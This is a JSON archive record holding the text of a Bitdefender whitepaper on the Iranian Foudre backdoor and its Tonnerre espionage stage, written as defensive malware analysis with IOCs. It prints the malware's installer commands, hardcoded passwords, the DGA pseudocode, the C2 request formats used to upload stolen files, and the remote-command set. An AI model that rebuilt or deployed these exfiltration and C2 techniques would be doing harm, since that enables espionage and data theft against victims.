{
    "id": "992936bd-4753-4de9-9e0d-9612e119766f",
    "created_at": "2022-10-25T16:48:12.268777Z",
    "updated_at": "2025-03-27T02:11:55.129214Z",
    "deleted_at": null,
    "sha1_hash": "ecc24b2c887a4a243d4d2b80e6c7c35700cd073c",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-PR-Whitepaper-IranTL-creat5161-en_EN:Bitdefender-PR-Whitepaper-IranTL-creat5161-en_EN.indd",
    "authors": "",
    "file_creation_date": "2021-02-19T23:02:51Z",
    "file_modification_date": "2021-02-19T23:02:57Z",
    "file_size": 6670552,
    "plain_text": "### Security\n# Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\nwww.bitdefender.com\n\n\n-----\n\n## Contents\n\nExecutive Summary.................................................................................................................................................. 3\n\nKey Findings:............................................................................................................................................................. 3\n\nAnalyzing Foudre and Tonnerre............................................................................................................................... 3\n\n2d459929135993959cacceb0dd81a813 – doc analysis..........................................................................................................3\n\n491786aa4bc9d1f09b9c793b21e80073 (Program Office2019.exe) analysis......................................................................4\n\n## Contents\n\ncfee183cf4bbe22ecbdf0d73ff16e0fb – Foudre version 23......................................................................................................4\n\n175bd76c33491d6b97731c8755ade093: Foudre’s next stage - Tonnere.............................................................................4\n\nCommand and Control servers for Tonnerre and Foudre......................................................................................9\n\nTonnerre sinkhole victims........................................................................................................................................ 9\n\nIOCs.........................................................................................................................................................................10\n\nMitre Matrix TTPs...................................................................................................................................................11\n\n**Author:**\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n\n## Executive Summary\n\nBitdefender researchers recently investigated the\ndecade-old Foudre (French for “lightning”) APT that now\nuses a new component named “Tonnerre” (French for\n[“thunder”). First investigated in May 2016, the Foudre](https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\nmalware is allegedly of Iranian origin and traditionally\ntargets both government and the private sector.\n\nOur investigation also revealed that the C&C\ninfrastructure is still active and that there are victims\nphoning back home. It’s safe to speculate that this\nparticular Iranian APT is still operational despite flying\nunder the radar in recent years.\n\n\n## Key Findings:\n\n\nThe investigation started from a sample submitted for\nanalysis to our researchers . Once unpacked, the archive\ncontained both a document and a binary, both installing\na backdoor into the compromised machine. Since the\nbackdoor is designed to work on x86 and x64 Windows\nmachines, threat actors were likely betting that victims\nwould download and open the archive.\n\n\nApart from some improvements in the Foudre backdoor\ninvolving C&C communication and forensic investigation\nresilience tactics, the APT group also used a secondstage payload named Tonnerre. This second component\nhas several functionalities, ranging from persistence\nto data exfiltration. This could allow attackers to take\nscreenshots, collect recent files and documents with\nspecific extensions, and even record audio using the\nsystem’s microphone before uploading that data to the\nattacker-controlled C&C.\n\nIn this recent investigation, Bitdefender security\nresearchers focused on dissecting the malicious\npayloads and investigating their capabilities.\n\n\n\n- Decade-old Iranian APT still has active C&C\ninfrastructure\n\n- New C&C communication capabilities for “Foudre”\nAPT malware\n\n- “Tonnerre” component used for persistence,\nsurveillance and data exfiltration\n\n- New TLDs for Tonnerre C&C infrastructure\n## Analyzing Foudre and Tonnerre\n\nWe were able to analyze the content of one of the zip\nfiles:\n\nZip file: .لئاسرلا اورظتناzip ```\n9c1982c30c5ac019417072eb6827de07\n\n```\nIt contains 2 files, a Word document and an executable:\n\nلئاسرلا اورظتنا.doc:\n```\n2d459929135993959cacceb0dd81a813\n\n```\nProgram Office2019.exe:\n```\n491786aa4bc9d1f09b9c793b21e80073\n\n```\nBoth the document and the “Program Office2019”\nexecutable install the Foudre (version 23) backdoor on\nthe system, so the attacker uses two tactics to trick the\nvictim to install the malware.\n\n#### 2d459929135993959cacceb0dd81a813 – doc analysis\nThe malicious document contains macros and an\nembedded rar sfx executable. When opened, the macros\nwill run and will execute the embedded exe.\n```\nd01bcca6255a4f062fc59a014f407532– rar sfx that\n\n```\ncontains, among some images:\n\n d569de7d83936cb961a949b8bdcfa3f1–\n“conf3616.dll”\n cfee183cf4bbe22ecbdf0d73ff16e0fb–\n“d530”\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n“conf3616.dll” is a dll responsible for installing the Foudre backdoor (“d530”). It is similar to the one described by\n[Tencent in a blog post from November 2020 (https://cloud.tencent.com/developer/article/1738806). The rar sfx exe](https://cloud.tencent.com/developer/article/1738806)\nexecutes the installer dll like this:\n\nSilent=1\nOverwrite=2\nUpdate=U\nPath=%temp%\\tmp5699\nSetup=rundll32.exe conf3616.dll f8755 d530\n\n#### 491786aa4bc9d1f09b9c793b21e80073 (Program Office2019.exe) analysis\nThe sample is a RAR SFX self-extracting installer that contains 2 dlls and a jpg:\n `827626def03076264c7948d47452e725– “conf3803.dll”`\n `cfee183cf4bbe22ecbdf0d73ff16e0fb– “d288”`\n `4bcdc131621953f3c0a58fe0e0c812f6- “Digi-Swirls.jpg”`\nThis rar sfx exe is similar to the one in the document. Its role is to install the Foudre backdoor on the system using the\ninstaller dll:\n\nSilent=1\nOverwrite=2\nUpdate=U\nPath=%temp%\\tmp764\nSetup=rundll32.exe conf3803.dll f8755 d288\n\nBoth the document and the executable installs the same variant of Foudre version 23:\n```\ncfee183cf4bbe22ecbdf0d73ff16e0fb.\n\n#### cfee183cf4bbe22ecbdf0d73ff16e0fb – Foudre version 23\n```\nThe sample is very similar to versions 21/22 described in Tencent’s blog post, sharing the same domain generating\nalgorithm (DGA). As mentioned by Tencent, the Foudre backdoor records keystrokes and sends keylogs to the C2, but\nalso downloads the next stage, which is deployed to high-value victims.\n\n#### 175bd76c33491d6b97731c8755ade093: Foudre’s next stage - Tonnere\n[The next stage downloaded by Foudre seems to be a variant of Infy M described by Palo Alto in 2016 (https://unit42.](https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\n[paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/). As they said, this variant of](https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\nInfy is sent only to high-value victims.\n\nEven if they share many functionalities, this sample has a DGA, similar to the Foudre variant of Infy found by Palo Alto\nin 2017. Also similar to the Foudre backdoor, we observed that the malware creates a window named “tonnere,” so it’s\nsafe to name the malware Tonnere.\n\nThe analyzed sample is Tonnere v11. This malware seems to have been used since 2017, as we found a Tonnere v1\nsample that has the compilation timestamp 2017-01-04 15:38:26. The compilation timestamp for v11 we analyzed is\n2019-06-20 16:51:34.\n\n#### Detailed analysis\nThe malware is a rar sfx password-protected exe, downloaded and executed by the initial Foudre backdoor. The\npassword (“RBA4b5a98Q”) is hardcoded in the Foudre backdoor and sent as a command line parameter when it\nexecutes Tonnere. The command line also contains the “/set” parameter, telling Tonnere to add persistence. The rar\narchive contains an executable and a certificate used to validate the CNC’s responses.\n\n#### dedbec01f4d61c65b24425b6039038f2 – Tonnere v11\nThe exe found in the archive is a Delphi executable that has 5 graphical forms, each one with a specific functionality:\n\n- Form 1: Deals with persistence and initialization of the malwarei\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n- Form 3: Implements a ftp client that receives commands from the ftp server and executes them\n\n- Form 4: Seems to not be used, its functionality being implemented in Form2\n\n- Form 5: The role of this form is to record audio using the system’s microphone, but this functionality seems to be\ndisabled by default\n\nEach of these forms will be described below.\n\n##### Form1:\n\nThis form initializes various strings used by the malware and parses the command line and adds persistence,\ndepending on the parameters\n\n- The malware can receive 2 possible parameters:\n\n   - /set<crc>: it installs the malware in programdata/Synaptics/<random>and executes it with the -ex\nparameter\n\n      - Persistence: Scheduled Task; in case it can’t add a scheduled task, as backup it adds a registers run key\n\n      - It also receives a crc code as a parameters; It gets the machine GUID (SOFTWARE\\Microsoft\\\nCryptography\\MachineGuid), it applies a CRC32s hash on it and compares the crc with the one provided\nas parameter; If it doesn’t match, it stops execution\n\n      - Generates a random directory in %programdata%/Synaptics/<random>\n\n      - Saves the random directory name in registers, in HKEY_CURRENT_USER, L”Software\\\\temp”, L”tran1”; it also\nadds the string “TNIV33M” in the global atom table to know that the malware was installed; on further runs, it\nwill check for “TNIV33M” and if found, will get the directory name from the registers\n\n      - Copies itself as “helper.exe” and the public.cer in that directory\n\n      - Runs the exe using the “-ex” command line parameters\n\n   - -ex <crc>: executes the malware\n\n      - It checks for the crc to match and also checks if the malware runs from a path that contains “synaptics”\n(lower case)\n\n      - Inits strings used by the malware\n\n##### Form2:\n\n- The role of this form is to make screenshots, collect various files and communicate with the cnc\n\n- There are 2 main functions: Init, Timer\n\n- The initialization function:\n\n   - Sets a timer for the (Timer) function that collects files (detailed below) and communicates with the cnc\n\n   - Creates the base folder for the collected files:\n\n      - %programdata%/Synaptics/G directory if “dfserv.exe” is not found running on the system (dfserv.\nexeseems to be a component of Deep Freeze software)\n\n      - “D:\\dfserv\\”or “E:\\dfserv” if “dfserv.exe” is found running on the system and such a fixed drive\nexists\n\n   - 5 other folders are created in the base folder:\n\n      - S - used to store the screenshots\n\n      - R - used to store the files found in %AppData%\\Microsoft\\Windows\\Recent\\\n\n      - F - seems to be used to store files collected from system’s drives, but that functionality seems to be disabled\n\n      - H - used to store various collected files (described below)\n\n      - V - used to store microphone recordings\n\n   - Creates a file “clist.dat” that keeps the list of the collected files; the file locations is as follows:\n\n      - %programdata%if “dfserv.exe” is not running\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n- Creates a password used to compress the collected files:\n\n   - If “public.cer” can be found in the malware folder, the archive password is random and is encrypted with the\npublic key\n\n   - Else, a hardcoded password is used: “1v-kQCh5eiBiSzKyE_HCQ”\n\n- The Init function also creates a function that monitors for new/modified files in %AppData%\\Microsoft\\\nWindows\\Recent\\\n\n   - The collected files are archived and the archive is saved in the “R” folder\n\n   - It collects files of sizes between 1 byte and 8mb\n\n- Clarification:\n\n   - Before being saved in its corresponding folder (as detailed above), each file is compressed with FlexCompress\n(.fxc format) and the archive is password protected;\n\n   - At the end of each archive is appended the following hex encoded data:\n\n      - <encypted_archive_password> or (“Error” if the default hardcoded password was used)\n\n      - <computer_name>\n\n      - <username>\n\n      - <malware_version>\n\n      - <main_folder>-- hardcoded to “fdir1”\n\n      - <MachineGuid>-- from SOFTWARE\\Microsoft\\Cryptography\\MachineGuid\n\n      - <filepath>\n\n   - There is one archive for one file, each file is compressed individually and the above data is appended to the\narchive\n\n- The timer function:\n\n   - Collects files measuring between 1 byte and 8mb from the current user’s:\n\n      - Documents folder\n\n      - Desktop folder\n\n      - Download folder\n\n      - Contacts folder\n\n      - Pictures folder\n\n      - Logical drives (DRIVE_FIXED, DRIVE_RAMDISK, DRIVE_REMOVABLE, DRIVE_REMOTE) \n         - It looks only in these folders:\n $recycle.bin\n documents and settings\n msocache\n program files\n program files (x86)\n programdata\n recovery\n system volume information\n users\n windows\n boot\n inetpub\n i386\n appdata\n temporary internet files\n appdata\\local\\microsoft\n $windows.~bt\n `d877f783d5d3ef8c`\n all users\n wp-content\\uploads\n\nk d\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n         - It looks only in same folders as for logical drives\n\n      - Mentions:\n\n It only collect files with the following extensions: .doc, .docx, .xls, .xlsx, .xlr, .pps,\n.ppt, .pptx, .mdb, .accdb, .db, .dbf, .sql, .jpg, .jpeg, .psd, .tif, .png,\n.txt, .text, .rtf, .odt, .htm, .html, .pdf, .wps, .one, .contact, .csv,\n.nbu, .vcf, .pst, .msg, .ost, .zip, .rar, .7z, .zipx, .pgp, .tc, .vhd,\n.p12, .crt, .pem, .key, .pfx, .asc, .cer, .p7b, .sst\n “d877f783d5d3ef8c” is a directory used by Telegram\n\n- The files collected are archived (one archive per file) and the archives are saved in the “H” folder\n\n- The “clist.dat” file mentioned previously keeps information about the collected files\n\n   - Each line has this format:\n\n<crc32(filename)>-<filesize>-<timestamp_of_last_write_time>\n\n   - The malware ensures that a file is exfiltrated only once using this file; if a file metadata (like above) already\nappears in “clist.dat”, the file is skipped\n\n- The timer function is also responsible for communicating with the CNC, starting a thread that:\n\n   - [Makes some dummy requests to http://www.msn.com to check if the system is connected to the internet and a](http://www.msn.com/)\nproxy is used\n\n   - Then, a DGA is used to get a responsive cnc; the DGA is similar to the Foudre’s DGA, but it uses other TLDs:\n\n<base_url> = hex(crc(“NITV1” + year + week_number))\nfirstCNC = <base_url>.site\n\nif firstCNC is not responding:\n[<lbd> = make request to https://www.france24.com/en/rss and get the last build](https://www.france24.com/en/rss)\ndate (<lastBuildDate>) -- usually is the date of current day\n<base_str> = “NITV1” + <lbd>.year + <lbd>.month + <lbd>.current_week\n<base_url> = hex(crc32(<base_str>))\ncnc = <base_url>.site\n\nif cnc is not responding:\n\nfor i = 1, i <= 100; i++:\n<base_url> = hex(crc(<base_str> + str(i)))\nif any of <base_url>.site, <base_url>.win, <base_url>.com is re\nsponding, then that it will be used as cnc\n\nIf none of above cncs responded:\n[<base_url> = md5(GET http://www.breakingnews.com/feeds/rss)](http://www.breakingnews.com/feeds/rss)\nif <base_url>.host is not responding:\n[<base_url> = md5(GET http://www.platts.com/rssfeeddetail/metals)](http://www.platts.com/rssfeeddetail/metals)\ncheck if <base_url>.com is responding\n\n- A GET request is made to http://<cnc>//2016/?c=<computer_name>&u=<username>&v=<malware_\nversion>&f=<base_folder>&mi=<machine_guid>&t=<time_string> in order to download the next stage\n\n   - <time_string> has this format: “<year>-<month>-<day>--<hour>-<minute>-<second>”\n\n   - The file is downloaded in %temp%/fttemp01.tmp\n\n- A GET request is made to http://<cnc>//2017/?c=<computer_name>&u=<username>&v=<malware_\nversion>&f=<base_folder>&mi=<machine_guid>&t=<time_string> to download a signature used to verify the fresh\ndownloaded next stage\n\n   - The file is downloaded in %temp%/ftsdci32.tmp\n\n- All requests are using the following user agent: “Mozilla/5.0 (Windows NT 6.1; WOW64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36”\n“2.187.193.169” “2.187.193.169”\n\n- Validates the next stage exe using the signature file and runs it with the following arguments:\n\n   - -sp/set -pTtckjcAa54cE\n\n- Then it uploads each collected archive measuring at least 100 bytes and maximum 8mb to the cnc:\n\nA POST request is made to http://<cnc>/blog/?<time string> with the following body :\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n      - c=<computer_name>&u=<username>&v=<malware_version>&f=<base_\nfolder>&txt=<base64(archive_content)>&e=EOF\n\n- The timer function also makes screenshots and saves them in %temp%:\n\n   - The screenshot file names have this format:\n\n      - “psf<year>-<month>-<day>--<hour>-<minutes>-<seconds>.tmp”\n\n   - The screenshots are collected, archived and the archives are saved in the “S” folder\n\n##### Form 3: ftp client with the role of communicating with the cnc\n\n- Init\n\n   - Creates a ftp client with username <currentUsername> and password tpass14A43\n\n- Timer:\n\n   - Calls a function that tries to get a ftp address from the cnc:\n\n      - Makes a GET request to http://<cnc>/f/?c=<computer_name>&mi=<machine_guid>&t=<time_string>&d=<year_\nday> in order to receive the address of a ftp server\n\n      - The resulting file is saved in %temp%/rfttest1.tmp\n\n      - “d” query parameter has this format:\n<year><day_number>\n\n         - Where <day_number> represents how many days passed since the beginning of the year\n\n      - If the address is not “127.0.0.1”, the malware connects to the ftp server\n\n- To get a command, the ftp client use the Quote ftp method; the result of a command (success/fail) is sent using\nSetLocalFileName with the appropriate value before making the Quote call\n\n- The server responds with a string in this format\n“500 ?MY<command>”\n\n- The following commands can be sent by the server:\n\nMYIDLE- do nothing\nMYSYSINFO- uploads systems info to the ftp server\nMYDIR- dir command\nMYPUT- downloads a file from the ftp server\nMYGET- uploads a file to the ftp server\nMYZIPGET- uploads a file as zip it to the ftp server\nMYDELETE- deletes a file\nMYRENAME- renames a file\nMYRUN - executes a files\nMYENDTASK- terminates a process\nMYZIP- zips a file\nMYSHELL- remote shell\n\n- The only command not seen in the Infy M malware described by Palo Alto in 2016 is MYSYSINFO:\n\n   - This commands gets the list of antivirus products, firewall products, running processes, network adapters and\nuploads it to the ftp server\n\n##### Form 4:\n\n- This form was not used in the Infy M described by Palo Alto, but its role seems to be to collect files from the logical\ndrives and store (archived as above) them in the “F” folder\n\n- This functionality is already present in Form2\n\n##### Form 5: records audio using the system’s microphone\n\n- Initialization function:\n\n   - Creates a folder named “lame” in the same directory where “clist.dat” can be found (%programdata% or\n“df ” b )\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n      - Creates a file named “vc.dat” in the “lame” folder that stores instructions for audio recording, including\nminimum volume level, minimum active time and a command line to convert from waw to mp3:\n“lame.exe -b 8 -m m rvfrtc8.tmp fcvd10v.tmp”\n\n      - The recording is stored in the same folder in a file named “tvfn.tmp”\n\n      - The function starts the audio recording only if the first line of the “vc.dat” file is “active”; however, the\nfirst line of “vc.dat” that the malware drops is “Off”, so it seems that this functionality is not enabled by\ndefault and may be enabled using commands received from the cnc\n\n- Timer1 function:\n\n   - When the file size exceeds 5mb, the audio recording is paused, the file is renamed and converted to mp3 and in\nthe end the audio recording is resumed:\n\n      - The “tvfn.tmp”waw file is renamed into “rvfrtc8.tmp” then converted to mp3 using the command\nfrom “vc.dat” (see above); the resulted mp3 file is named “fcvd10v.tmp”\n\n- Timer2 function:\n\n   - The role of this function is to collect the mp3 file to be exfiltrated\n\n   - The mp3 file is archived (like described above.) and the archive is saved in the “V” folder\n\n   - In the end, the mp3 file “fcvd10v.tmp”and the waw file “rvfrtc8.tmp”are deleted\n## Command and Control servers for Tonnerre and Foudre\n\nTonnere uses the TLDs “site”, “win” and “com”.\n\nThe different Foudre versions sometimes use different TLD combinations consisting of: “space,”net”,”top”,”dynu.net”,\n“info”, “website” and “host”. With this information we were able to locate the following historical and currently active\ncommand and control servers.\n\nIP Address Malware\n\n185.203.116.111 Tonnerre\n\n85.217.171.149 Tonnerre\n\n185.141.61.37 Tonnerre\n\n93.115.22.216 Tonnerre\n\n185.56.137.138 Foudre\n\n172.96.184.191 Foudre\n\n198.252.96.160 Foudre\n\n## Tonnerre sinkhole victims\n\nKnowing the Tonnerre’s DGA, we could sinkhole a C2 and find new victims. More precisely, we sinkholed the domain\nbetween 25-31 January: 4f04b918[.]site, where 4f04b918 is the CRC32 for “NITV1202114”.We found\n79 IPs v4 and 43 IPs v6 that show normal malware traffic behavior, making the initial request to check if the C2 is\nresponsive using the user agent hardcoded in the Tonnerre v11 sample.\n\nAs the request that checks if a C2 is valid doesn’t contain information that could uniquely identify a victim, we can’t\naccurately estimate the number of victims: the victims could have changed several times during the sinkhole period.\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n**2**\n\n**3**\n\n**26** **2** **23**\n\n## IOCs\n```\n28e2c4d6e8194e299c62ed757ddf33e9 – initial zip\n2d459929135993959cacceb0dd81a813 – malicious document\ncfee183cf4bbe22ecbdf0d73ff16e0fb – Foudre version 23\n827626def03076264c7948d47452e725 – installer dll\nd569de7d83936cb961a949b8bdcfa3f1 – installer dll\n491786aa4bc9d1f09b9c793b21e80073 – Foudre sfx\nd01bcca6255a4f062fc59a014f407532 – Foudre sfx\n175bd76c33491d6b97731c8755ade093 – Tonnerre sfx\n956b805669e167a3327d089d7f9c37f8 – Tonnerre version 1\ndedbec01f4d61c65b24425b6039038f2 – Tonnerre version 11\n\n```\n\n**2**\n\n**3**\n\n**26** **2** **23**\n**41**\n\n**24**\n\n\n-----\n\nIranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo\n\n## Mitre Matrix TTPs\n\n|Initial Access|Spearphishing Attachment (T1566.001)|Col3|Col4|Col5|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|Execution|User Execution: Malicious File (T1204.002)|Command and Scripting Interpreter: Visual Basic (T1059)|Native API (T1106)|||||\n|Persistence|Scheduled Task/Job (T1053.002)|Registry Run Keys / Startup Folder (T1547.001)||||||\n|Defense Evasion|Masquerading (T1036)|Obfuscated Files or Information (T1027)||||||\n|Discovery|File and Directory Discovery (T1083)|Network Share Discovery (T1083)|Process Discovery (T1057)|System Information Discovery (T1082)|System Time Discovery (T1124)|||\n|Collection|Archive Collected Data (T1560)|Audio Capture (T1123)|Clipboard Data (T1115)|Screen Capture (T1113)|Data from Local System (T1005)|Data from Network Shared Drive (T1039)|Data Staged (T1074)|\n|Command And Control|Web Protocols (T1071.001)|Domain Generation Algorithms (T1568.002)|Fallback Channels (T1008)|||||\n|Exfiltration|Exfiltration Over C2 Channel (T1041)|Automated Exfiltration (T1020)||||||\n\n\n-----\n\n#### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nmedium enterprises, service providers and technology integrators. We take thousands of resellers and distributors worldwide.\npride in the trust that enterprises such as Mentor, Honeywell, Yamaha,\n**Speedway, Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n#### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with\n**VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n#### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://download.bitdefender.com/resources/files/News/CaseStudies/study/393/Bitdefender-Whitepaper-Iranian-APT-Makes-a-Comeback-with-Thunder-and-Lightning-Backdoor-and-Espionage-Combo.pdf"
    ],
    "report_names": [
        "Bitdefender-Whitepaper-Iranian-APT-Makes-a-Comeback-with-Thunder-and-Lightning-Backdoor-and-Espionage-Combo.pdf"
    ],
    "threat_actors": [
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041515,
    "ts_creation_date": 1613775771,
    "ts_modification_date": 1613775777,
    "files": {
        "pdf": "https://archive.orkl.eu/ecc24b2c887a4a243d4d2b80e6c7c35700cd073c.pdf",
        "text": "https://archive.orkl.eu/ecc24b2c887a4a243d4d2b80e6c7c35700cd073c.txt",
        "img": "https://archive.orkl.eu/ecc24b2c887a4a243d4d2b80e6c7c35700cd073c.jpg"
    }
}